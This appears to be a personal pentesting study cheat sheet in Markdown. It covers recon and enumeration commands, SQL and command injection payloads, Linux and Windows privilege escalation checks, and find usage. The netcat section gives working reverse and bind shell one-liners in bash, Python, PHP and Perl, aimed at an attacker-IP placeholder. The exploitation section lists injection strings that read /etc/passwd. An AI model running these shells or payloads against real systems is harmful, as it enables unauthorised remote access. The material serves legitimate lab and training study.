# 🛡️ Cybersecurity & Pentesting Knowledge Base

This document serves as a **detailed encyclopedia** of cybersecurity techniques, exploits, and pentesting methodologies. Use it to **revise, review, and apply** hacking concepts learned from **TryHackMe**, **HackTricks**, and other sources.

---

## 📁 1. Reconnaissance

### 🔹 Active vs Passive Recon
- **Active:** Direct interaction (e.g., `nmap`, `dirb`)
- **Passive:** Indirect observation (e.g., WHOIS, Google Dorking)

### 🔹 Tools
| Tool           | Purpose              |
|----------------|----------------------|
| `nmap`         | Network scanning     |
| `whois`        | Domain info lookup   |
| `dig`          | DNS enumeration      |
| `theHarvester` | OSINT gathering      |
| `subfinder`    | Subdomain discovery  |

### 🔹 Commands
```sh
nmap -sC -sV -oN scan_results.txt [target-ip]
subfinder -d target.com
```

---

## 📂 2. Enumeration

### 🔹 SMB Enumeration
```sh
smbclient -L //[IP]
enum4linux -a [IP]
```

### 🔹 Web Directory Enumeration
```sh
gobuster dir -u http://[target] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js -o gobusterResults.txt
```

### 🔹 Sub Domain Enumeration
```sh
gobuster dns -d [target] -w /usr/share/wordlists/dnsWordlist/Top1000-Subdomains.txt -o gobusterDnsResults.txt
ffuf -u [target] -H "Host: FUZZ.[target]" -w /usr/share/wordlists/dnsWordlist/Top1000-Subdomains.txt
```

---

## 💥 3. Exploitation

### 🔹 SQL Injection
```sh
# Manual
' OR 1=1 --

# Automated
sqlmap -u "http://target.com/index.php?id=1" --dbs
```

### 🔹 Command Injection
```sh
# URL-based
http://target.com/page?cmd=whoami

# Payloads
&& whoami
; cat /etc/passwd
| ls -la
```

---

## ⚡ 4. Privilege Escalation

### 🔹 Linux PrivEsc
```sh
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
find /etc/ -writable                        # Writable config files
```

### 🔹 Windows PrivEsc
```sh
whoami /priv
.\winPEAS.exe
```

---

## 🧰 5. Tools Overview

| Category      | Tools                                     |
|---------------|-------------------------------------------|
| Recon         | `nmap`, `theHarvester`, `subfinder`, `dig` |
| Enumeration   | `enum4linux`, `gobuster`                  |
| Exploitation  | `sqlmap`, `hydra`, `metasploit`           |
| PrivEsc       | `linPEAS`, `winPEAS`, `GTFOBins`          |

---

## 🐚 6. Netcat & Reverse Shells

### 🔹 Basics
```sh
# Listener
nc -lvnp 4444

# Connect to listener
nc [ip] 4444
```

### 🔹 Reverse Shell (Attacker Listens)
```sh
# Attacker
nc -lvnp 4444

# Victim
nc [attacker_ip] 4444 -e /bin/bash
```

### 🔹 Bind Shell (Victim Listens)
```sh
# Victim
nc -lvnp 4444 -e /bin/bash

# Attacker
nc [victim_ip] 4444
```

### 🔹 Without -e flag (mkfifo method)
```sh
mkfifo /tmp/s; /bin/bash < /tmp/s | nc [attacker_ip] 4444 > /tmp/s
```

### 🔹 One-Liner Shells
```sh
# Bash
bash -i >& /dev/tcp/[ip]/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("[ip]",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash"])'

# PHP
php -r '$sock=fsockopen("ip",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### 🔹 Shell Upgrade
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🔎 7. `find` Command Usage

### 🔹 Basic Syntax
```sh
find [path] [options] [expression]
```

### 🔹 Examples

#### By Name
```sh
find . -name "file.txt"
find . -iname "file.txt"
```

#### By Type
```sh
find . -type f
find . -type d
find . -type l
```

#### By Size
```sh
find . -size +100M
find . -size -10k
find . -empty
```

#### By Permissions
```sh
find / -perm -4000 -type f 2>/dev/null     # SUID
find . -perm 644
find . -perm /u+x
```

#### By Owner/Group
```sh
find . -user root
find . -group sudo
```

#### Exclude Files
```sh
find . ! -name "*.log"
```

#### Search Entire Filesystem
```sh
sudo find / -name "passwd" 2>/dev/null
```

---

## Python httpServer

```sh
python3 -m http.server 8000
```

---

## 📚 8. Learning Resources

- 🔗 [TryHackMe](https://tryhackme.com/)  
  Guided cybersecurity labs and hands-on hacking exercises.

- 🔗 [HackTricks](https://book.hacktricks.xyz/)  
  A comprehensive hacking encyclopedia with practical tips and tricks.

- 🔗 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  
  A collection of useful payloads and bypass techniques for web, privilege escalation, and more.

- 🔗 [GTFOBins](https://gtfobins.github.io/)  
  Exploitable Unix binaries for privilege escalation and command execution.

- 🔗 [Censys](https://search.censys.io/)  
  Search engine for internet-connected devices and services, useful for recon and attack surface discovery.

- 🔗 [VirusTotal](https://www.virustotal.com/gui/home/upload)  
  Multi-antivirus file and URL scanning service for analyzing potentially malicious content.

- 🔗 [Shodan](https://www.shodan.io/)  
  Search engine for internet-connected devices and open ports; powerful for reconnaissance.


---

## 🧠 9. TODOs & Future Topics

- [ ] Reverse Shells: Deep dive and persistence
- [ ] Web Exploits: XSS, CSRF, SSRF, etc.
- [ ] Post-Exploitation: Maintaining access, exfiltration
- [ ] Blue Teaming: Defense, detection, hardening
